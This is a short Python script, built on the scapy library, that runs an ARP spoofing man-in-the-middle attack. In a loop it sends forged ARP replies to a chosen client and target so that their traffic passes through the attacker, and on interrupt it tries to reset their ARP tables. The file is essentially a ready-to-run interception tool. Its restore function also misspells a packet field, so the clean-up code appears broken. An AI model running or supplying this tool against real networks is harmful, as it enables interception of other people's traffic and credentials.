#!/usr/bin/env python3
"""A simple script used to initialize a MiTM attack.
   Script uses Python 3"""

import scapy.all as scapy
import argparse
import time


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--client', dest='client', help='Client IP.')
    parser.add_argument('-t', '--target', dest='target', help='Target IP.')
    (options) = parser.parse_args()

    return options


def get_mac(ip):
    """Performs ARP scan of network based on user supplied criteria."""
    arp_request = scapy.ARP(pdst=ip)                                                # sets destination IP address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                                # sets broadcast MAC address
    arp_request_broadcast = broadcast/arp_request                                   # creates ARP request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]   # send/receive ARP packets

    return answered_list[0][1].hwsrc                                                # returns MAC address


def spoof(target_ip, spoof_ip):
    """Sends spoof packets to target hosts."""
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)       # creates ARP packet
    scapy.send(packet, verbose=False)                                               # sends ARP packet


def restore(destination_ip, source_ip):
    """Restores ARP tables."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hddst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()                                                           # captures argument from terminal
client_ip = options.client
target_ip = options.target
sent_packets_count = 0

try:
    while True:
        spoof(target_ip, client_ip)                                                 # spoof client
        spoof(client_ip, target_ip)                                                 # spoof target
        sent_packets_count += 2
        print(f'\r[+] Packets sent: {str(sent_packets_count)}', end="")             # overwrites status
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Detected CTRL + C ..... Resetting ARP tables.... Please Wait.\n')
    restore(target_ip, client_ip)                                                   # restore client
    restore(client_ip, target_ip)                                                   # restore target
